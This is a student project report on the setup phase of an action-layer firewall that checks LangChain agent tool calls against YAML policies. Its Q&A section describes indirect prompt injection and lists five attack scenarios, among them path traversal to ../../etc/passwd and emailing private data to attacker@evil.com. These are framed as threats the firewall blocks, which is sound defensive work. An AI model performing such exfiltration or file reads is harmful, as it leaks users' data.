# Phase 0 — Complete Report & Presentation Guide
## Deterministic Action Firewall for AI Agents

**Date:** 2026-08-13  
**Phase:** 0 — Project Scaffolding & Environment Setup  
**Status:** ✅ Complete  

---

## Table of Contents

1. [What is Phase 0?](#1-what-is-phase-0)
2. [Step-by-Step Guide to Run Phase 0](#2-step-by-step-guide-to-run-phase-0)
3. [Complete Work Summary — What Was Built](#3-complete-work-summary--what-was-built)
4. [File-by-File Breakdown](#4-file-by-file-breakdown)
5. [Technology Stack Explained](#5-technology-stack-explained)
6. [Architecture Overview](#6-architecture-overview)
7. [How the Knowledge Vault Works](#7-how-the-knowledge-vault-works)
8. [Test Results & Verification](#8-test-results--verification)
9. [Presentation Q&A Preparation](#9-presentation-qa-preparation)
10. [Glossary of Key Terms](#10-glossary-of-key-terms)

---

## 1. What is Phase 0?

Phase 0 is the **foundation-laying phase** of the project. Before writing any firewall logic, policy rules, or attack demos, we need a clean, working project structure that every team member can clone, install, and run tests on with zero errors.

**Think of it like building the foundation of a house before putting up walls.** Phase 0 delivers:

- A well-organized folder/directory structure
- All required dependencies (libraries) listed and installable
- A working test framework (pytest) with initial verification tests
- Version control (Git) initialized with a clean first commit
- CI/CD pipeline (GitHub Actions) configured to run tests automatically
- Documentation scaffolding (README, PROGRESS tracker, Knowledge Vault)
- Environment variable management (no hardcoded secrets)

**Why this matters:** A project that can't be set up reliably on a new machine is a project that will fail during a live demo. Phase 0 eliminates that risk.

---

## 2. Step-by-Step Guide to Run Phase 0

### Prerequisites

Before starting, make sure you have these installed on your computer:

| Software | Version | How to Check | Download Link |
|----------|---------|-------------|---------------|
| Python | 3.11 or higher | `python --version` | [python.org](https://www.python.org/downloads/) |
| Git | Any recent version | `git --version` | [git-scm.com](https://git-scm.com/downloads) |
| VS Code (recommended) | Latest | Open it | [code.visualstudio.com](https://code.visualstudio.com/) |

### Step 1: Open PowerShell / Terminal

Press `Win + X` → select **Windows Terminal** or **PowerShell**.

### Step 2: Navigate to the Project

```powershell
cd "C:\Users\aifaa\Desktop\Final Year Project\Project Main"
```

### Step 3: Create a Virtual Environment

A **virtual environment** is an isolated Python installation so this project's libraries don't conflict with other Python projects on your machine.

```powershell
python -m venv venv
```

This creates a `venv/` folder inside the project directory.

### Step 4: Activate the Virtual Environment

```powershell
# On Windows PowerShell:
.\venv\Scripts\Activate.ps1

# If you get an "execution policy" error, run this ONCE first:
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
# Then try activating again
```

**How to know it worked:** You'll see `(venv)` appear at the beginning of your terminal prompt:
```
(venv) PS C:\Users\aifaa\Desktop\Final Year Project\Project Main>
```

### Step 5: Install All Dependencies

```powershell
pip install -r requirements.txt
```

This reads `requirements.txt` and installs every library the project needs. It will download packages like LangChain, FastAPI, Streamlit, pytest, etc. This may take 2-5 minutes depending on your internet speed.

**Expected output (end):**
```
Successfully installed langchain-1.3.15 langchain-core-1.5.4 fastapi-0.141.1 
streamlit-1.61.1 pytest-9.1.1 ... (many more packages)
```

### Step 6: Run the Test Suite

```powershell
pytest --verbose
```

**Expected output:**
```
============================= test session starts =============================
platform win32 -- Python 3.14.6, pytest-9.1.1
collected 3 items

tests/test_scaffold.py::test_firewall_package_import    PASSED  [ 33%]
tests/test_scaffold.py::test_langchain_tool_instantiation PASSED [ 66%]
tests/test_scaffold.py::test_hello_world_execution      PASSED  [100%]

============================== 3 passed in 0.16s ==============================
```

✅ **If you see "3 passed" — Phase 0 is working correctly.**

### Step 7: Run the Hello World Demo Script

```powershell
python -m demo_agent.hello_world
```

**Expected output:**
```
Executing hello world tool smoke test...
Tool Result: Echo: Hello from LangChain Agent!
```

This confirms LangChain tools can be defined and invoked in our project.

### Step 8: (Optional) Launch the Dashboard Shell

```powershell
streamlit run dashboard/app.py
```

This opens a browser tab showing the empty Streamlit dashboard skeleton. Press `Ctrl+C` in the terminal to stop it.

### Step 9: Check Git Status

```powershell
git log --oneline
```

**Expected output:**
```
c7e22e7 Phase 0: Project scaffolding, environment setup, and knowledge vault initialization
```

---

## 3. Complete Work Summary — What Was Built

### Directory Structure Created

```
Project Main/
│
├── .github/
│   └── workflows/
│       └── ci.yml                  ← GitHub Actions CI pipeline
│
├── firewall/                       ← Core firewall library (empty shell)
│   └── __init__.py
│
├── policies/                       ← YAML policy files (populated in Phase 2)
│   └── .gitkeep
│
├── demo_agent/                     ← Sample LangChain agent + mocked tools
│   ├── __init__.py
│   └── hello_world.py
│
├── dashboard/                      ← Streamlit monitoring dashboard
│   ├── __init__.py
│   └── app.py
│
├── tests/                          ← Test suite (pytest)
│   ├── __init__.py
│   └── test_scaffold.py
│
├── docs/
│   └── knowledge/                  ← Knowledge Vault (Obsidian-compatible)
│       ├── index.md                ← Map of Content
│       ├── CHANGELOG.md            ← Project change log
│       ├── concepts/
│       │   ├── action-firewall.md
│       │   ├── interception-layer.md
│       │   └── policy-engine.md
│       └── decisions/              ← Architecture Decision Records
│           ├── 0003-policy-engine-deployment-mode.md
│           ├── 0004-tool-scale-scope.md
│           ├── 0005-hitl-approval-mechanism.md
│           └── 0006-agent-framework-choice.md
│
├── .env.example                    ← Environment variable template
├── .gitignore                      ← Git exclusion rules
├── LICENSE                         ← MIT License
├── PROGRESS.md                     ← Phase-by-phase progress tracker
├── README.md                       ← Project overview + architecture diagram
└── requirements.txt                ← Python dependencies
```

**Total: 24 files across 12 directories, all committed to Git.**

---

## 4. File-by-File Breakdown

### Configuration & Setup Files

| File | Purpose | Why It Matters |
|------|---------|----------------|
| `requirements.txt` | Lists all Python packages the project depends on | Anyone can run `pip install -r requirements.txt` to get the exact same environment — reproducibility |
| `.env.example` | Template showing what environment variables are needed | Real values go in `.env` (which is gitignored). Prevents hardcoded API keys from leaking |
| `.gitignore` | Tells Git which files/folders to NOT track | Excludes `venv/`, `.env`, `*.db`, `__pycache__/` — keeps the repo clean |
| `LICENSE` | MIT open-source license | Required for any public repository; says "anyone can use this code" |

### Documentation Files

| File | Purpose |
|------|---------|
| `README.md` | First thing anyone sees when they open the repo. Contains project description, architecture diagram (Mermaid), setup instructions, and a defensive-testing disclaimer |
| `PROGRESS.md` | Living document tracking which phases are complete, in progress, or pending. Updated at the end of every phase |

### CI/CD Pipeline

| File | Purpose |
|------|---------|
| `.github/workflows/ci.yml` | GitHub Actions workflow that automatically runs `pytest` every time code is pushed to the `main` branch. Catches broken code before it's merged |

### Source Code Files

| File | Purpose |
|------|---------|
| `firewall/__init__.py` | Marks the `firewall/` folder as a Python package. Sets `__version__ = "0.1.0"` |
| `demo_agent/__init__.py` | Marks `demo_agent/` as a Python package |
| `demo_agent/hello_world.py` | A smoke test that defines a LangChain `@tool` (called `echo_tool`) and invokes it. Proves the LangChain integration works |
| `dashboard/__init__.py` | Marks `dashboard/` as a Python package |
| `dashboard/app.py` | Streamlit dashboard skeleton showing placeholder metrics (Total Calls, Allowed, Blocked) and an empty audit log feed |
| `tests/__init__.py` | Marks `tests/` as a Python package |
| `tests/test_scaffold.py` | Three verification tests: (1) firewall package imports, (2) LangChain tool works, (3) hello world runs correctly |

### Knowledge Vault Files

| File | Purpose |
|------|---------|
| `docs/knowledge/index.md` | Map of Content — links to all concept notes and decisions. Entry point for the Obsidian vault |
| `docs/knowledge/CHANGELOG.md` | Sequential log of every meaningful change with commit hashes |
| `docs/knowledge/concepts/*.md` | One-page notes explaining core concepts (action-firewall, interception-layer, policy-engine) with `[[wikilinks]]` connecting them |
| `docs/knowledge/decisions/*.md` | Architecture Decision Records (ADRs) documenting why we made specific design choices, what alternatives we rejected, and what the tradeoffs are |

---

## 5. Technology Stack Explained

### 5.1 Python 3.11+

**What it is:** A high-level programming language. The entire project is written in Python.

**Why we use it:** LangChain (our primary agent framework) is Python-native. Python has the richest ecosystem for AI/ML tooling and is the most common language in security research.

**Key Python concepts used in this project:**
- **Decorators (`@`)** — Used extensively. Our `@firewall_guard` (Phase 1) wraps tool functions to intercept calls. The `@tool` decorator from LangChain marks a function as an agent tool.
- **Packages (`__init__.py`)** — Every folder with an `__init__.py` is a Python package, meaning its modules can be imported by other code.
- **Virtual Environments (`venv`)** — Isolated Python installations preventing dependency conflicts between projects.

---

### 5.2 LangChain

**What it is:** An open-source framework for building applications powered by Large Language Models (LLMs). It provides abstractions for "tools," "agents," "chains," and "memory."

**Why we use it:** LangChain is the most widely-used agent framework. Its `Tool` abstraction has a clean, single function-call wrapping point — making it straightforward to intercept tool calls with a decorator.

**How it works in our project:**
```
User gives task → LLM Agent reasons about what tool to call →
Agent outputs structured JSON: {"tool": "send_email", "args": {"to": "...", "body": "..."}} →
LangChain framework calls the tool function →
★ THIS IS WHERE OUR FIREWALL SITS — between the framework and the actual function call ★
```

**Key LangChain concept used in Phase 0:**
```python
from langchain_core.tools import tool

@tool
def echo_tool(message: str) -> str:
    """Echoes back the input message."""
    return f"Echo: {message}"
```

The `@tool` decorator tells LangChain "this Python function is a tool an agent can call." It automatically generates a schema (name, description, parameter types) that the LLM uses to decide when and how to call it.

---

### 5.3 FastAPI

**What it is:** A modern, high-performance Python web framework for building REST APIs.

**Why we use it:** The firewall service exposes a REST API (in later phases) for the dashboard to query audit logs and for health-check endpoints. FastAPI auto-generates interactive documentation (Swagger UI) and validates request data automatically using Pydantic.

**Used in Phase:** 3+ (Logging API), 7 (Health checks). Not active in Phase 0 yet, but installed.

---

### 5.4 Streamlit

**What it is:** A Python library that turns Python scripts into interactive web apps with minimal code. No HTML/CSS/JavaScript needed.

**Why we use it:** Building a full React dashboard would take weeks. Streamlit lets us create a functional monitoring dashboard in hours. It's reliable for live demos — critical for a viva.

**Phase 0 usage:** A skeleton dashboard showing placeholder metrics:
```python
import streamlit as st
st.title("🛡️ AI Agent Action Firewall — Live Security Dashboard")
col1, col2, col3 = st.columns(3)
col1.metric(label="Total Tool Calls", value="0")
```

---

### 5.5 pytest

**What it is:** Python's most popular testing framework. Tests are plain Python functions that start with `test_`.

**Why we use it:** Every phase must produce runnable tests alongside code. pytest discovers and runs them automatically.

**Phase 0 usage — 3 tests:**

| Test | What it checks |
|------|---------------|
| `test_firewall_package_import` | `import firewall` works and version is `0.1.0` |
| `test_langchain_tool_instantiation` | LangChain `@tool` can be defined and invoked |
| `test_hello_world_execution` | The demo agent's hello world function returns expected output |

**How to read a pytest test:**
```python
def test_firewall_package_import():
    """Verify core firewall package imports cleanly."""
    import firewall
    assert firewall.__version__ == "0.1.0"
    # assert = "this MUST be true, otherwise the test fails"
```

---

### 5.6 Git & GitHub Actions

**Git** is version control — it tracks every change to every file, lets you undo mistakes, and lets multiple people work on the same code.

**GitHub Actions** is a CI/CD (Continuous Integration / Continuous Deployment) service. Our `.github/workflows/ci.yml` file tells GitHub: "Every time someone pushes code to the `main` branch, spin up a Linux machine, install Python 3.11, install our dependencies, and run `pytest`. If any test fails, show a red ❌."

**Why this matters:** Prevents broken code from reaching the main branch. The green badge in the README proves the project builds and passes tests.

---

### 5.7 SQLite (upcoming — Phase 3)

**What it is:** A lightweight, file-based relational database. No server needed — the database is a single `.db` file.

**Why we use it:** Stores the audit trail (every tool call, every policy decision, every reason). Simple for development; the code is written to be PostgreSQL-compatible for production.

---

### 5.8 PyYAML

**What it is:** A Python library for reading and writing YAML files.

**Why we use it:** Our policy rules are defined in YAML files (human-readable, easy to edit). The policy engine parses them using PyYAML.

**Example policy (Phase 2 preview):**
```yaml
- name: block_path_traversal
  tool: read_file
  parameter: file_path
  rule: must_not_contain
  value: ".."
  action: DENY
  reason: "Path traversal attempt detected"
```

---

### 5.9 Pydantic

**What it is:** A data validation library for Python. Defines data models with type annotations and automatically validates input.

**Why we use it:** Ensures tool call metadata, policy definitions, and API payloads conform to expected schemas. If someone passes bad data, Pydantic raises a clear error instead of causing a silent bug.

---

### 5.10 Docker (upcoming — Phase 7)

**What it is:** A tool that packages an application and all its dependencies into a standardized "container" that runs identically on any machine.

**Why we use it:** `docker-compose up` brings up the entire system (firewall service + dashboard) with one command. Eliminates "works on my machine" problems during the viva demo.

---

## 6. Architecture Overview

```
┌──────────────────┐     ┌───────────────────────┐     ┌────────────────────────────┐     ┌──────────────────┐
│   User / Task    │────▶│  LLM Agent            │────▶│  ACTION FIREWALL           │────▶│  Mock Tool       │
│                  │     │  (LangChain)           │     │  (Your Project)            │     │  Execution       │
└──────────────────┘     └───────────────────────┘     └────────────────────────────┘     └──────────────────┘
                                                                  │
                                                       ┌──────────┴──────────┐
                                                       │                     │
                                                  ┌────▼─────┐    ┌────────▼────────┐
                                                  │  Policy   │    │  Audit Logger   │
                                                  │  Engine   │    │  (SQLite)       │
                                                  │  (YAML)   │    │  + Anomaly Det. │
                                                  └────┬──────┘    └────────┬────────┘
                                                       │                    │
                                                  Decision:            Dashboard
                                                  ALLOW /              (Streamlit)
                                                  DENY /
                                                  NEEDS_APPROVAL
```

**The key insight:** Traditional firewalls inspect network traffic. Our firewall inspects **tool function calls** — the structured actions an AI agent takes. This is a fundamentally different security layer operating at the **action layer**, not the network layer.

---

## 7. How the Knowledge Vault Works

The `/docs/knowledge/` directory is an **Obsidian-compatible vault** — a collection of interconnected Markdown notes using `[[wikilinks]]`.

**Why we have it:**
- The project build prompt requires maintaining living documentation
- Makes the project easy to understand for new team members
- Creates a visual graph of how components relate to each other
- Architecture Decision Records (ADRs) document *why* decisions were made, not just *what* was built

**How to use it:**
1. Download [Obsidian](https://obsidian.md/) (free)
2. Open → select `docs/knowledge/` as a vault
3. You'll see an interactive graph showing how concepts link to decisions

**Structure:**
- `index.md` — Table of contents linking everything
- `concepts/` — One note per core concept (what it is, what it depends on)
- `decisions/` — Numbered ADRs (context, decision, tradeoffs, alternatives rejected)
- `CHANGELOG.md` — Sequential log of changes with git commit references

---

## 8. Test Results & Verification

### pytest Output
```
============================= test session starts =============================
platform win32 -- Python 3.14.6, pytest-9.1.1, pluggy-1.6.0
rootdir: C:\Users\aifaa\Desktop\Final Year Project\Project Main
plugins: anyio-4.14.2, langsmith-0.10.18
collected 3 items

tests/test_scaffold.py::test_firewall_package_import         PASSED  [ 33%]
tests/test_scaffold.py::test_langchain_tool_instantiation     PASSED  [ 66%]
tests/test_scaffold.py::test_hello_world_execution            PASSED  [100%]

============================== 3 passed in 0.16s ==============================
```

### Hello World Demo Output
```
Executing hello world tool smoke test...
Tool Result: Echo: Hello from LangChain Agent!
```

### Git Commit
```
c7e22e7 Phase 0: Project scaffolding, environment setup, and knowledge vault initialization
24 files changed, 557 insertions(+)
```

---

## 9. Presentation Q&A Preparation

### Questions About Phase 0 Specifically

**Q1: "Why did you spend an entire phase just setting up the project? Why not jump straight into coding the firewall?"**

> A well-structured scaffold prevents cascading problems later. If the project structure is messy, adding new features in Phase 2-5 becomes increasingly painful — files go in wrong places, imports break, tests can't find modules. Phase 0 also ensures every team member can clone the repo and get a working environment in under 5 minutes. For a 3-person team, that's critical. Finally, it lets us verify that our core dependency (LangChain) actually works before we build anything on top of it.

**Q2: "What does each folder in your project do?"**

> - `firewall/` — The core library: interception decorator, policy engine, logger, anomaly detector
> - `policies/` — YAML files defining security rules (parameter bounds, RBAC scopes, domain allowlists)
> - `demo_agent/` — A sample LangChain agent with mocked tools for testing attack scenarios
> - `dashboard/` — A Streamlit web dashboard showing live audit feeds, blocked vs allowed counts, and anomaly alerts
> - `tests/` — Automated test suite using pytest
> - `docs/knowledge/` — Living documentation vault with architecture concepts and decision records

**Q3: "What is a virtual environment and why do you use one?"**

> A virtual environment (`venv`) is an isolated Python installation. Without it, installing packages globally could break other Python projects on the same machine (version conflicts). With `venv`, this project has its own copy of Python and all its packages — completely independent. It's standard practice for any Python project.

**Q4: "What does your CI/CD pipeline do?"**

> Our GitHub Actions workflow (`.github/workflows/ci.yml`) runs automatically every time code is pushed to the `main` branch. It spins up a clean Ubuntu machine, installs Python 3.11, installs all dependencies from `requirements.txt`, and runs `pytest`. If any test fails, the pipeline fails and shows a red ❌ badge. This catches broken code before it reaches production and gives confidence that the codebase is always in a working state.

**Q5: "Why pytest and not unittest?"**

> pytest is the de facto standard testing framework in the Python ecosystem. It requires less boilerplate than `unittest` (no class inheritance needed), has better error messages, auto-discovers test files, and has a rich plugin ecosystem. Our tests are simple functions with `assert` statements — readable even for beginners.

**Q6: "What is `.env.example` and why is `.env` in `.gitignore`?"**

> `.env.example` is a template showing what environment variables the project needs (API keys, database URLs, configuration flags). The actual values go in `.env`, which is listed in `.gitignore` so Git never tracks it. This prevents secrets (like API keys) from accidentally being committed to the repository and becoming publicly visible. This is a security best practice.

---

### Questions About the Overall Project Concept

**Q7: "What problem does your project solve?"**

> LLM agents with tool access are vulnerable to **indirect prompt injection** — malicious instructions hidden in fetched content (web pages, emails, API responses) can hijack the agent into calling tools in harmful ways. Traditional firewalls inspect network packets, not the semantic intent of a function call like `send_email(to="attacker@evil.com", body=private_data)`. Our project creates a **deterministic action-layer firewall** that intercepts every tool call and checks it against explicit policies before allowing execution.

**Q8: "How is this different from a prompt injection classifier?"**

> Prompt injection classifiers try to detect malicious *text* before it reaches the LLM — they're probabilistic pattern matchers competing against adversaries who can paraphrase, encode, or obfuscate payloads. That's a fundamentally unwinnable arms race. Our firewall doesn't care about the text. It checks the *action*: "Is this specific tool call, with these specific arguments, allowed by policy?" That's a deterministic, auditable check — not a probabilistic guess.

**Q9: "What are your 5 attack scenarios?"**

> 1. **Path traversal** — Agent told to read a config file, injected content makes it read `../../etc/passwd` → firewall blocks because path is outside allowed directory
> 2. **Data exfiltration** — Injected content makes agent email private data to an external domain → firewall blocks because domain isn't in the allowlist
> 3. **Privilege escalation** — Agent with read-only access is tricked into chaining `read_file` → `write_file` → firewall blocks the write due to RBAC scope
> 4. **Sequence violation** — Agent tries `send_email` without prior `compose_draft` + `human_approval` → firewall blocks due to state-machine rule
> 5. **Volume anomaly** — Injected content triggers 20 rapid-fire tool calls → firewall's anomaly detector halts the session

**Q10: "Why did you choose LangChain over AutoGen or LlamaIndex?"**

> Three reasons: (1) Largest community and tutorial base — critical for a beginner team hitting unfamiliar errors; (2) LangChain's `Tool` object has a simple, single wrapping point that maps directly onto a `@firewall_guard` decorator; (3) Most academic papers on LLM agent security use LangChain, making our literature review and comparisons easier. We note AutoGen as an optional extension to demonstrate generalization (ADR 0006).

**Q11: "Why in-process policy engine instead of OPA (Open Policy Agent)?"**

> OPA requires learning a new language (Rego), running a separate Go binary as a sidecar, handling REST round-trips and failure modes — disproportionate complexity for a project whose novelty is the interception architecture, not the policy language itself. An in-process evaluator has zero added latency, is easier to debug (one process, one stack trace), and demos reliably in a viva. OPA is noted as a stretch goal (ADR 0003).

**Q12: "What if the firewall itself crashes? Does the tool call go through?"**

> We explicitly chose **fail-closed** behavior (see `.env.example`: `FAIL_SAFE_MODE=fail_closed`). If the firewall encounters an unhandled exception, the tool call is **blocked**, not allowed. A firewall that fails open is itself a security vulnerability. This decision is documented and tested.

**Q13: "How do you prove 100% of calls are intercepted — no bypass path?"**

> In Phase 1, we write a test that creates an agent with 3+ tools, runs multiple calls, and verifies that every single call passes through the `@firewall_guard` wrapper. The decorator replaces the tool's function — there is no other execution path. We confirm this with a counter that increments on every interception and assert it matches the total call count.

**Q14: "What's novel about your project compared to existing tools like Rebuff, LLM Guard, or NeMo Guardrails?"**

> Those tools operate at the **input/output text layer** — they filter prompts and responses. Our project operates at the **action layer** — we inspect and enforce policy on the structured tool calls the agent makes at runtime. This is a fundamentally different defense point. Even if malicious text slips past every upstream filter and the model decides to act on it, our firewall still evaluates the resulting tool call against policy. We provide a full audit trail of exactly which actions were allowed, denied, or escalated, and why.

---

### Questions About Specific Technology Choices

**Q15: "Why YAML for policies instead of JSON or a database?"**

> YAML is human-readable and writable — a security team member can open a policy file, understand it, and write a new rule without knowing Python or SQL. During a live demo, we can edit a YAML file and show behavior changing in real time. JSON would work technically but is harder to read. A database would add unnecessary complexity for rule definition (rules don't change at runtime query speed — they're configuration, not data).

**Q16: "Why SQLite instead of PostgreSQL?"**

> SQLite requires zero setup — no server, no authentication, the database is a single file. For development and a viva demo, this is ideal. Our code uses SQLAlchemy as an ORM, so switching to PostgreSQL for production requires changing only one connection string — no code changes.

**Q17: "Why Streamlit instead of React?"**

> Streamlit turns a Python script into a web dashboard with zero HTML/CSS/JavaScript. For a 3-person beginner team on a 3-month timeline, building a React frontend would consume weeks that are better spent on the core firewall logic, policy engine, and attack scenarios. Streamlit is reliable for live demos — it can't have JavaScript build failures during a viva.

---

## 10. Glossary of Key Terms

| Term | Definition |
|------|-----------|
| **LLM** | Large Language Model — AI models like GPT, Claude, Gemini that process and generate text |
| **AI Agent** | An LLM with the ability to call external tools/functions (search web, send emails, read files) in a loop to complete tasks |
| **Indirect Prompt Injection** | A security attack where malicious instructions are hidden inside content the agent fetches (web pages, emails, documents), causing the agent to perform unintended actions |
| **Tool Call** | A structured function invocation made by an AI agent, e.g., `send_email(to="x@y.com", body="...")` |
| **Interception Layer** | The `@firewall_guard` decorator that wraps tool functions and routes calls through the policy engine before execution |
| **Policy Engine** | The component that evaluates tool calls against YAML-defined rules and returns ALLOW / DENY / NEEDS_APPROVAL |
| **RBAC** | Role-Based Access Control — restricting what tools/actions an agent session is allowed to use based on assigned permissions |
| **HITL** | Human-in-the-Loop — requiring a human to approve high-risk actions before they execute |
| **Anomaly Detection** | Identifying unusual patterns (call volume spikes, new tools being used) that may indicate an attack |
| **ADR** | Architecture Decision Record — a document recording a design decision, its context, alternatives considered, and consequences |
| **CI/CD** | Continuous Integration / Continuous Deployment — automated testing and deployment pipelines |
| **Fail-Closed** | Security behavior where if the firewall encounters an error, it blocks the action (safe default) rather than allowing it through |
| **Shadow Logging** | Recording allowed calls (not just blocked ones) for post-incident forensic analysis |
| **Decorator** | A Python pattern (`@decorator`) that wraps a function to add behavior before/after it runs, without modifying its code |
| **Virtual Environment** | An isolated Python installation for a specific project, preventing dependency conflicts |

---

*This report covers Phase 0 in its entirety. Phase 1 (Interception Layer) will build the `@firewall_guard` decorator and prove 100% tool call interception.*
